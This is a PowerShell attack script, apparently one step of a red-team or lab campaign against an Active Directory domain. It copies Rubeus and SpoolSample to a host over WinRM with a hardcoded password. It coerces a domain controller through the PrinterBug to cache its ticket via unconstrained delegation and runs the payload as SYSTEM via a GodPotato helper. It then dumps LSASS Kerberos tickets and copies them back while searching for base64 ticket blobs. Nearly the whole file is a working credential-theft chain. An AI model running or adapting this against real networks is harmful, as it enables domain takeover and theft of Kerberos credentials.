[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$TargetDC = "dc02.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$CaptureServer = "mbr01.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$BaseRemoteDir = "C:\Windows\Temp\cadre-tools",
    [Parameter(Mandatory=$false)]
    [string]$OutDir = "C:\Users\Public",
    [Parameter(Mandatory=$false)]
    [int]$CoerceWaitSeconds = 5
)
$ErrorActionPreference = "Stop"
$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", $securePass)

$runId = (Get-Date -Format yyyyMMddHHmmss)
$RemoteDir = Join-Path $BaseRemoteDir "T102-$runId"

$srcRubeus = Join-Path $ToolSource "Rubeus.exe"
$srcSpool = Join-Path $ToolSource "SpoolSample.exe"
if (-not (Test-Path $srcSpool)) { $srcSpool = Join-Path $ToolSource "Sliver\SpoolSample.exe" }
if (-not (Test-Path $srcSpool)) { $srcSpool = Join-Path $ToolSource "Old_Tools\SpoolSample.exe" }
if (-not (Test-Path $srcRubeus)) { throw "Rubeus.exe not found in $ToolSource" }
if (-not (Test-Path $srcSpool)) { throw "SpoolSample.exe not found in $ToolSource" }

$remoteRubeus = Join-Path $RemoteDir "Rubeus.exe"
$remoteSpool = Join-Path $RemoteDir "SpoolSample.exe"

$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($d) New-Item -ItemType Directory -Force -Path $d | Out-Null } -ArgumentList $RemoteDir
    Copy-Item -Path $srcRubeus -Destination $remoteRubeus -ToSession $sess -Force
    Copy-Item -Path $srcSpool -Destination $remoteSpool -ToSession $sess -Force
    Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) icacls $p1 /grant "Everyone:(RX)" | Out-Null; icacls $p2 /grant "Everyone:(RX)" | Out-Null } -ArgumentList $remoteRubeus,$remoteSpool
    Write-Output "T102_OK: STAGED Rubeus -> $remoteRubeus, SpoolSample -> $remoteSpool"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$spoolOut = Join-Path $OutDir "T102-spoolsample-$runId.txt"
$dumpOut = Join-Path $OutDir "T102-rubeus-dump-$runId.txt"
$remoteScriptPath = Join-Path $RemoteDir "T102-run.ps1"

$targetNetbios = ($TargetDC.Split('.')[0]).ToUpper()
$targetMachineAcct = $targetNetbios + '$'

$remoteScript = @"
`$rubeus = '$($remoteRubeus.Replace("'", "''"))'
`$spool = '$($remoteSpool.Replace("'", "''"))'
`$spoolOut = '$($spoolOut.Replace("'", "''"))'
`$dumpOut = '$($dumpOut.Replace("'", "''"))'
`$targetDC = '$($TargetDC.Replace("'", "''"))'
`$captureServer = '$($CaptureServer.Replace("'", "''"))'
`$targetMachineAcct = '$($targetMachineAcct.Replace("'", "''"))'
`$waitSeconds = $CoerceWaitSeconds

New-Item -ItemType Directory -Force -Path (Split-Path `$spoolOut) | Out-Null

Write-Output 'T102_TARGET_MACHINE_ACCOUNT=' + `$targetMachineAcct

# 1) Coerce target DC to authenticate to mbr01 (PrinterBug / MS-RPRN)
`$spoolOutput = & `$spool `$targetDC `$captureServer 2>&1
`$spoolOutput | Out-File -FilePath `$spoolOut -Encoding ASCII -Force
Write-Output 'T102_SPOOL_TRIGGERED'

# 2) Wait for the TGT to be cached in LSASS via unconstrained delegation
Start-Sleep -Seconds `$waitSeconds

# 3) Dump LSASS tickets for the target machine account
`$dumpOutput = & `$rubeus 'dump' '/user:' + `$targetMachineAcct '/nowrap' 2>&1
`$dumpOutput | Out-File -FilePath `$dumpOut -Encoding ASCII -Force
Write-Output 'T102_DUMP_DONE'

`$dumpItem = Get-Item `$dumpOut -ErrorAction SilentlyContinue
Write-Output ('T102_DUMP_SIZE=' + `$(if (`$dumpItem) { `$dumpItem.Length } else { 0 }))
`$kirbiCount = (Select-String -Path `$dumpOut -Pattern 'Kirbi' -ErrorAction SilentlyContinue | Measure-Object).Count
Write-Output ('T102_KIRBI_COUNT=' + `$kirbiCount)
"@

$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($p, $c) Set-Content -Path $p -Value $c -Encoding ASCII -Force } -ArgumentList $remoteScriptPath, $remoteScript
    Invoke-Command -Session $sess -ScriptBlock { param($p) icacls $p /grant "Everyone:(RX)" | Out-Null } -ArgumentList $remoteScriptPath
    Write-Output "T102_OK: WROTE remote script -> $remoteScriptPath"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$execScript = "powershell -NoProfile -ExecutionPolicy Bypass -File `"" + $remoteScriptPath + "`""
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -GpPath (Join-Path $BaseRemoteDir "GodPotato.exe") -ScriptBlock $execScript

Start-Sleep -Seconds 5

$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) if (Test-Path $p1) { icacls $p1 /grant "Everyone:(R)" | Out-Null }; if (Test-Path $p2) { icacls $p2 /grant "Everyone:(R)" | Out-Null } } -ArgumentList $spoolOut,$dumpOut
    $localDir = "C:\Tools\cadre-attack"
    if (-not (Test-Path $localDir)) { New-Item -ItemType Directory -Path $localDir -Force | Out-Null }
    if (Test-Path $spoolOut) { Copy-Item -Path $spoolOut -Destination "$localDir\T102-spoolsample-$runId.txt" -FromSession $sess -Force }
    if (Test-Path $dumpOut) { Copy-Item -Path $dumpOut -Destination "$localDir\T102-rubeus-dump-$runId.txt" -FromSession $sess -Force }
    Write-Output "T102_OK: PULLED spool/dump logs to $localDir"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$localDump = "$localDir\T102-rubeus-dump-$runId.txt"
if (Test-Path $localDump) {
    Write-Output "=== T102 Rubeus dump output (first 100 lines) ==="
    Get-Content $localDump -ErrorAction SilentlyContinue | Select-Object -First 100

    $kirbiLines = Get-Content $localDump -ErrorAction SilentlyContinue | Select-String -Pattern "Kirbi|doIF|doIE|doID|doIH|doII|doIJ|doIK|doIL|doIM|doIN|doIO|doIP|doIQ|doIR|doIS|doIT|doIU|doIV|doIW|doIX|doIY|doIZ|doIa|doIb|doIc|doId|doIe|doIf|doIg|doIh|doIi|doIj|doIk|doIl|doIm|doIn|doIo|doIp|doIq|doIr|doIs|doIt|doIu|doIv|doIw|doIx|doIy|doIz|doJA|doJB|doJC|doJD|doJE|doJF|doJG|doJH|doJI|doJJ|doJK|doJL|doJM|doJN|doJO|doJP|doJQ|doJR|doJS|doJT|doJU|doJV|doJW|doJX|doJY|doJZ|doJa|doJb|doJc|doJd|doJe|doJf|doJg|doJh|doJi|doJj|doJk|doJl|doJm|doJn|doJo|doJp|doJq|doJr|doJs|doJt|doJu|doJv|doJw|doJx|doJy|doJz"
    if ($kirbiLines) {
        Write-Output "=== T102 CAPTURED TGT INDICATORS ==="
        $kirbiLines | Select-Object -First 10
    } else {
        Write-Output "T102_INFO: No Kirbi/base64 ticket indicators found in dump output"
    }
} else {
    Write-Output "T102_INFO: No dump output captured"
}
